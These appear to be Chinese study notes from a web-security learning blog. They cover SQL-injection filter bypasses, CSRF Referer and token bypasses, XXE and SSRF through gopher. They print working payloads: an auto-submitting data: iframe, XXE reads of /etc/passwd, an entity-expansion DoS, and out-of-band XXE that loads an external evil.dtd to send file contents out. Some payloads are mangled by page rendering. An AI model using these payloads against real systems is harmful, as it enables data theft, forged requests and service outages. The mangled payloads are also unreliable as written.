<h5 id="2-注入流程图"><a href="#2-注入流程图" class="headerlink" title="[2] 注入流程图"></a>[2] 注入流程图</h5><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1656476375&t=82f2380c052f036e8454035070bc6a42" alt="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&amp;refer=http%3A%2F%2Fimg-blog.csdnimg.cn&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1656476375&amp;t=82f2380c052f036e8454035070bc6a42"></p>
<h4 id="5-mysql错误分析解决"><a href="#5-mysql错误分析解决" class="headerlink" title="5.mysql错误分析解决"></a>5.mysql错误分析解决</h4><h5 id="1）子查询结果多于一行"><a href="#1）子查询结果多于一行" class="headerlink" title="1）子查询结果多于一行"></a>1）子查询结果多于一行</h5><p><code>Subquery returns more than 1 row</code></p>
<p>以<code>select * from table1 where table1.colums=(select columns from table2)</code>这个sql语句为例</p>
<blockquote>
<p>1.如果是写入重复，去掉重复数据。然后写入的时候，可以加逻辑判断(php)或者外键(mysql)，防止数据重复写入。（但在实际开发中可能需要重复写入，所以需要慎重考虑）</p>
<p>2.在子查询条件语句加<code>limit 1</code>,找到一个符合条件的就可以了<br><code>select * from table1 where table1.colums in (select columns from table2 limit 1)</code> </p>
<p>如果需要继续向后查询，可以用<code>limit 0,1</code>   <code>limit 1,1</code>   <code>limit 2,1</code>   …..  <code>limit n,1</code></p>
<p>3.在子查询前加any关键字<br>&#96;select * from table1 where table1.colums&#x3D;any(select columns from table2)</p>
</blockquote>
<h5 id="ps-子查询语句"><a href="#ps-子查询语句" class="headerlink" title="ps. 子查询语句"></a>ps. 子查询语句</h5><p><strong>子查询</strong>是指在<strong>一个select语句中嵌套另一个slecet语句</strong>。</p>
<p><strong>any、in、some、all</strong>分别是子查询关键词之一。</p>
<p><strong>any</strong>可以与&#x3D;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&lt;&gt;结合起来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的任何一个数据。</p>
<p>all可以与&#x3D;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&lt;&gt;结合是来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的其中的所有数据。</p>
<p>他们进行子查询的语法如下：</p>
<blockquote>
<p><code>operand comparison_operator any(subquery);</code><br><code>operand in (subquery);</code><br><code>operand coparison_operator some(subquery);</code><br><code>operand coparison_operator all (subquery);</code></p>
</blockquote>
<p><strong>any,all关键词必须与一个比较操作符一起使用</strong></p>
<p>any关键词可以理解为<strong>对于子查询返回的列中的<u>任意</u>数值，如果比较结果为ture，则返回true</strong><br>例如：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1 &gt; <span class="keyword">any</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> t2)</span><br></pre></td></tr></table></figure>

<p>假设表t1中有一行包含（10） ， t2包含（20,12,5），则表达式为true；如果t2包含（20,10），或者表t2位空表，则表达式为false。如果t2包含（null，null），则表达式为unkonwn。</p>
<p>all关键词<strong>对于子查询返回的列中的<u>所有值</u>，如果比较结果为true，则返回true</strong><br>例如：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1&gt; <span class="keyword">all</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> s2)</span><br></pre></td></tr></table></figure>

<p>假设表t1中有一行包含（10）。如果表t2包含（-5,0，+5），则表达式为true，因为10比t2中的查出的所有三个值大。如果表t2包含（12,6，null，-100），则表达式为false，因为t2中有一个值12大于10。如果表t2包含（0，null，1），则表达式为unknown。如果t2为空表，则结果为true。</p>
<p>not in 是 “&lt;&gt;all”的别名，用法相同。<br>语句in 与“&#x3D;any”是相同的。<br>例如：</p>
<p><code>select s1 from t1 where s1 = any (select s1 from t2)</code><br><code>select s1 from t1 where s1 in (select s1 from t2)</code></p>
<p>语句some是any的别名，用法相同。<br>例如：</p>
<p><code>select s1 from t1 where s1 &lt;&gt; any (select s1 from t2)</code><br><code>select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)</code></p>
<h4 id="6-mysql-连接函数，-分组连接函数"><a href="#6-mysql-连接函数，-分组连接函数" class="headerlink" title="6.mysql 连接函数， 分组连接函数"></a>6.mysql 连接函数， 分组连接函数</h4><blockquote>
<h5 id="1-concat"><a href="#1-concat" class="headerlink" title="1.concat()"></a>1.concat()</h5><p>concat(str1,str2,…)</p>
<p>若有一个参数为NULL，返回NULL</p>
<h5 id="2-concat-ws"><a href="#2-concat-ws" class="headerlink" title="2.concat_ws()"></a>2.concat_ws()</h5><p>concat_ws(‘间隔符号’,str1,str2,…)</p>
<p><strong>间隔符号可以是空格，不能不写，否则返回为空</strong></p>
<p>显示为str1间隔符号str2间隔符号str3…</p>
<h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h5><p>group_concat([distinct] 字段名 [ order by 排序字段 asc&#x2F;desc ] [separator “分隔符”])</p>
<p>多行数据在一行显示函数</p>
<p>根据group by指定的列进行排序分组，将同一组显示出来，并用分隔符间隔</p>
<h5 id="ps-组合使用"><a href="#ps-组合使用" class="headerlink" title="ps. 组合使用"></a>ps. 组合使用</h5><p>如果是多字段组合 显示在一行的eg：</p>
<p>group_concat(concat_ws(‘,’,concat(str1，str2) ) )；</p>
<p>一个字段的话eg：</p>
<p>group_concat(concat_ws(‘,’,str1，str2) )； </p>
</blockquote>
<h4 id="7-过滤替换"><a href="#7-过滤替换" class="headerlink" title="*7.过滤替换"></a>*7.过滤替换</h4><h5 id="1）双写绕过"><a href="#1）双写绕过" class="headerlink" title="1）双写绕过"></a>1）双写绕过</h5><blockquote>
<p>(用于把黑名单的字符替换成空)：se<u>select</u>lect,un<u>union</u>ion，oorr等等（替换为空后，剩余语句就是标准的sql语句，不会影响语句的正常执行）</p>
<p>ps.注意，有的语句命令可能会带有黑名单的字符，也需要双写，如<u>or</u>der,inf<u>or</u>mation.schema_schemata等，当网站在检查时，同样会被替换为空，所以需要写成o<u>or</u>rder,info<u>or</u>rmation.schema_schemata等等</p>
</blockquote>
<h5 id="2）大小写混合"><a href="#2）大小写混合" class="headerlink" title="2）大小写混合"></a>2）大小写混合</h5><blockquote>
<p>(用于黑名单中只有小写或大写，并没有对大小写进行区分)</p>
<p>如sEleCt,unIoN等等</p>
</blockquote>
<h5 id="3）替换"><a href="#3）替换" class="headerlink" title="*3）替换"></a>*3）替换</h5><blockquote>
<p>select：</p>
<p>union：</p>
<p>空格：%0a（分隔符），() 【如select(table_name)from(xxx)】，&lt; &gt;， %20(space), %09(tab), IFS$9（$IFS是<strong>Unix</strong>系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</p>
<p>&#x3D;：like</p>
<p>and：&amp;&amp;</p>
<p>or：||</p>
</blockquote>
<h4 id="8-注释符"><a href="#8-注释符" class="headerlink" title="8. 注释符"></a>8. 注释符</h4><blockquote>
<p>#、 –+、 –%20、 %23</p>
</blockquote>
<h2 id="二、xss"><a href="#二、xss" class="headerlink" title="二、xss"></a>二、xss</h2><p>把<code>xss-labs</code>做一下就差不多了，后面进阶内容按是需要学习吧</p>
<h2 id="三、csrf"><a href="#三、csrf" class="headerlink" title="三、csrf"></a>三、csrf</h2><h3 id="1）绕过token"><a href="#1）绕过token" class="headerlink" title="1）绕过token"></a>1）绕过token</h3><p>有的时候其实网站根本不验证<code>token</code>，但是在其他方面上它仍然在工作，所以为了绕过它可以考虑抓包删去<code>token</code>，从而正常访问</p>
<h3 id="2）绕过referer"><a href="#2）绕过referer" class="headerlink" title="2）绕过referer"></a>2）绕过referer</h3><h4 id="1-referer条件为空条件时"><a href="#1-referer条件为空条件时" class="headerlink" title="1.referer条件为空条件时"></a>1.referer条件为空条件时</h4><blockquote>
<p>解决方案:</p>
<p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>这个时候浏览器地址栏是<code>file://</code>开头的，</p>
<p>如果这个HTML页面向任何http站点提交请求的话，这些请求的<code>Referer</code>都是空的。</p>
<p>例:<br><code>1.利用data:协议</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>base64</code>编码 解码即可看到代码</p>
<p><code>2.利用https协议</code><br>https向http跳转的时候Referer为空<br>拿一个https的webshell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;https://xxxxx.xxxxx/attack.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>attack.php写上CSRF攻击代码</p>
</blockquote>
<h4 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h4><blockquote>
<p>比如你找的csrf是<a href="https://link.zhihu.com/?target=http://xxx.com">http://xxx.com</a> </p>
<p>验证的referer是验证的*.<a href="https://link.zhihu.com/?target=http://xx.com">http://xx.com</a> </p>
<p>可以找个二级域名 之后&lt;img “csrf地址”&gt; 之后在把文章地址发出去 就可以伪造。</p>
</blockquote>
<h4 id="3-判断referer是否存在某关键字"><a href="#3-判断referer是否存在某关键字" class="headerlink" title="3.判断referer是否存在某关键字"></a>3.判断referer是否存在某关键字</h4><blockquote>
<p>referer判断存在不存在<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>这个关键词</p>
<p>在网站新建一个<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>目录 把CSRF存放在<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>目录,即可绕过</p>
</blockquote>
<h4 id="4-判断Referer是否含有某域名"><a href="#4-判断Referer是否含有某域名" class="headerlink" title="4.判断Referer是否含有某域名"></a>4.判断Referer是否含有某域名</h4><blockquote>
<p>判断了Referer开头是否以<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a>以及126子域名 不验证根域名为<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a> 那么我这里可以构造子域名<a href="https://link.zhihu.com/?target=http://x.126.com.xxx.com">http://x.126.com.xxx.com</a>作为蠕虫传播的载体服务器，即可绕过。</p>
</blockquote>
<h3 id="3）不同浏览器的区别"><a href="#3）不同浏览器的区别" class="headerlink" title="3）不同浏览器的区别"></a>3）不同浏览器的区别</h3><p> 在满足上述前后端条件后，浏览器在完成预检请求后会自动携带上Cookie字段，但是由于浏览器的内核特性不同，此时又出现了不同的情况</p>
<blockquote>
<p>  <code>Firefox</code>携带网站A的Cookie值发起POST请求<br>  <code>Edge</code>没有携带网站A的Cookie值发起POST请求<br>  <code>Chrome</code>没有携带网站A的Cookie值发起POST请求</p>
</blockquote>
<h2 id="四、xxe"><a href="#四、xxe" class="headerlink" title="四、xxe"></a>四、xxe</h2><blockquote>
<p><a href="https://www.jianshu.com/p/ec2888780308">推荐学习文章</a></p>
</blockquote>
<h3 id="必须在文档类型定义-DTD-中创建实体"><a href="#必须在文档类型定义-DTD-中创建实体" class="headerlink" title="必须在文档类型定义 (DTD) 中创建实体"></a>必须在文档类型定义 (DTD) 中创建实体</h3><p><img src="/2022/05/28/Web-study/image-20221015095141092.png" alt="image-20221015095141092"></p>
<p>正如您所看到的，一旦 XML 文档被解析器处理，它将<code>js</code>用定义的常量<code>“Jo Smith”</code>替换定义的实体。如您所见，这有很多优点，因为您可以<code>js</code>在一个地方更改为例如<code>“John Smith”</code>。</p>
<p>在 <code>Java</code> 应用程序中，<code>XML</code> 可用于从客户端获取数据到服务器，我们都熟悉 <code>JSON api</code>，我们也可以使用 <code>xml</code> 来获取信息。大多数情况下，框架会根据 <code>xml</code> 结构自动填充 <code>Java</code> 对象，例如：</p>
<p><img src="/2022/05/28/Web-study/image-20221015095555062.png" alt="image-20221015095555062"></p>
<blockquote>
<p>PCDATA:<br>它是XML解析器解析的文本数据使用的一个术语。XML 文档中的文本通常解析为字符数据，或者（按照文档类型定义术语）称为 PCDATA。</p>
<p>XML 的特殊字符（&amp;、&lt; 和 &gt;）在 PCDATA 中可以识别，并用于解析元素名称和实体。PCDATA（字符数据）区域被解析器视为数据块，从而允许您在数据流中包含任意字符。</p>
</blockquote>
<p>如果 XML 解析器配置为<strong>允许外部 DTD 或实体</strong>，我们可以使用以下内容更改以下 XML 片段：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在会发生什么？我们从本地文件系统中定义了一个包含，<code>XML</code> 解析器将加载该文件，并将在引用实体的任何位置添加内容。假设 XML 消息返回给用户，消息将是：</p>
<p><img src="/2022/05/28/Web-study/image-20221015094930498.png" alt="image-20221015094930498"></p>
<hr>
<h3 id="XXE-DOS攻击"><a href="#XXE-DOS攻击" class="headerlink" title="XXE DOS攻击"></a>XXE DOS攻击</h3><p>同XXE攻击我们可以执行一个DOS服务攻击对服务器。 一个例子的攻击是： </p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=&quot;<span class="number">1.0</span>&quot;?&gt;</span></span><br><span class="line"><span class="params">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="params"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ELEMENT lolz (#PCDATA)&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol1 &quot;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol2 &quot;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol3 &quot;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol4 &quot;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol5 &quot;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol6 &quot;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol7 &quot;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol8 &quot;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol9 &quot;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;lolz&gt;</span><span class="variable">&amp;lol9</span><span class="punctuation">;</span><span class="params">&lt;/lolz&gt;</span></span><br></pre></td></tr></table></figure>

<p>当<code>XML  parser</code>载这个文件，它认为，它包括一个根本的元素，”<code>lolz</code>“，包含的文本”<code>&amp;lol9</code>;”.  然而，”<code>&amp;lol9</code>;”是一个已定义的实体，扩展为一个包含十个”&amp;lol8;”串。  每个”<code>&amp;lol8</code>;”串是一个已定义的实体，扩展到十”<code>&amp;lol7</code>;”串，等等。  </p>
<p>在所有的实体扩张，已经进行处理，<strong>这一小型(&lt;1KB)的框XML实际上会采取了几乎3千兆字节的存储器。</strong> </p>
<h3 id="盲注XXE"><a href="#盲注XXE" class="headerlink" title="盲注XXE"></a>盲注XXE</h3><p>在许多情况下，攻击者可以将 <code>XXE</code> <code>payload</code>发送到 <code>Web</code> 应用程序，但<strong>永远不会返回响应</strong>，这被称为带外漏洞（<code>Out-of-band</code>）</p>
<p>利用此类漏洞的过程需要利用参数实体，使攻击者让 <code>XML</code> 解析器向攻击者</p>
<p><strong>控制的服务器发出额外的请求，以便读取文件的内容</strong></p>
<p>作为一个攻击者你有<code>WebWolf</code>在你的控制( <strong>这可以是任何服务器你的控制之下.</strong> ), 例如，可以使用这个服务器平使用  <code>http://127.0.0.1:9090/home</code></p>
<p>我们如何使用这些终端检验我们是否可以执行<code>XXE</code>? </p>
<p>我们可以再次使用WebWolf举办一个文件叫  <code>attack.dtd</code> 创建这一文件与以下内容： </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">ping</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; class=&quot;bare&quot;&gt;http://127.0.0.1:9090/landing&lt;/a&gt;&lt;/a&gt;&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在提交形式的改变使用<code>xml</code>： </p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;webWolfLink:[webWolfLink]&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%remote;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>test<span class="symbol">&amp;ping;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>现在<code>WebWolf</code>浏览’进入的<code>请求</code>，你会看到： </p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;method&quot;</span> : <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span> : <span class="string">&quot;/landing&quot;</span>,</span><br><span class="line">  <span class="string">&quot;headers&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;request&quot;</span> : &#123;</span><br><span class="line">      <span class="string">&quot;user-agent&quot;</span> : <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;test&quot;</span> : [ <span class="string">&quot;HelloWorld&quot;</span> ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;timeTaken&quot;</span> : <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，通过<code>XXE</code>能够连接我们自己的服务器，这意味着<code>XXE</code>注入是可能的。 因此，通过<code>XXE</code>注入我们基本上能够达到，<code>curl</code>命令的相同的效果 </p>
<h4 id="引用远程服务器上的DTD"><a href="#引用远程服务器上的DTD" class="headerlink" title="引用远程服务器上的DTD"></a>引用远程服务器上的DTD</h4><p>另一种方式<code>% 变量</code>(有空格)，该方式只能在DTD中进行变量引用<code>%变量</code>，而不能在XML中引用。</p>
<p>改为引用远程服务器上的DTD(<code>evil.dtd</code>)</p>
<p>如果在响应包中<strong>无回显又想要读取敏感文件</strong>时，可以通过<code>OOB</code>带外注入的方法<strong>通过外带数据通道来提取数据</strong>，构造<code>payload</code>如下 ：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">body</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///tmp/test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">//攻击者远程部署evil.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XXE-介绍与绕过"><a href="#XXE-介绍与绕过" class="headerlink" title="XXE 介绍与绕过"></a>XXE 介绍与绕过</h3><p>一个 <code>xml</code> 文档不仅可以用 <code>UTF-8</code> 编码，也可以用 <code>UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412)</code> 和 <code>EBCDIC</code> 编码。 </p>
<p>在这种编码的帮助下，使用<code>正则表达式可以很容易地绕过 WAF</code>，因为在这种类型的 WAF 中，正则表达式<code>通常仅配置为单字符集</code>。 <code>外来编码也可用于绕过成熟的 WAF</code>，因为它们并不总是能够处理上面列出的所有编码。</p>
<p>例如，<code>libxml2</code> 解析器只支持一种类型的 <code>utf-32 - utf-32BE</code>，特别是不支持 <code>BOM</code>。</p>
<hr>
<h2 id="五、ssrf"><a href="#五、ssrf" class="headerlink" title="五、ssrf"></a>五、ssrf</h2><h3 id="不当函数利用"><a href="#不当函数利用" class="headerlink" title="不当函数利用"></a>不当函数利用</h3><blockquote>
<p>PHP中下面函数的使用不当会导致SSRF:<br>&#96;&#96;file_get_contents()<code> </code>fsockopen()<code> </code>curl_exec()&#96;   </p>
</blockquote>
<h5 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h5><blockquote>
<p><code>file_get_content()</code>函数是用于将文件的内容读入到一个字符串中的首选方法，逻辑和前面一样。它支持读取远程文件或者本地文件，也支持多种协议。更多的，它还支持php伪协议，我们可以利用伪协议方法读取本地源码</p>
</blockquote>
<h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><blockquote>
<p>通过<code>curl_exec()</code>函数执行url传过来参数给的地址，然后将参数返回前端。如果url参数被替换成<a href="http://xxxx或者curl支持的其他协议等都会被curl执行(curl支持`telnet/">http://xxxx或者curl支持的其他协议等都会被curl执行（curl支持`telnet</a> ftp ftps dict file ldap&#96;等）</p>
</blockquote>
<h3 id="gopher协议总结"><a href="#gopher协议总结" class="headerlink" title="gopher协议总结"></a>gopher协议总结</h3><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667791">原文</a></p>
<p><a href="https://blog.csdn.net/qq_60115503/article/details/124407499">另一篇推荐的文章</a></p>
</blockquote>
<blockquote>
<p>gopher协议</p>
<p>是一种信息查0找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面</p>
</blockquote>
<h4 id="1-利用："><a href="#1-利用：" class="headerlink" title="1)利用："></a>1)利用：</h4><blockquote>
<p>攻击内网的 <code>Redis、Mysql、FastCGI、Ftp</code>等等，也可以发送 <code>GET、POST</code> 请求</p>
</blockquote>
<p>gopher协议的格式：</p>
<blockquote>
<p><code>gopher://IP:port/_TCP/IP数据流</code>  </p>
<p>比如，</p>
<p><code>gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</code></p>
</blockquote>
<blockquote>
<p>有时候读取文件需要从网站<code>本身的127.0.0.1发出请求</code></p>
<p>可以利用<code>file://</code>伪协议用于读取本地文件</p>
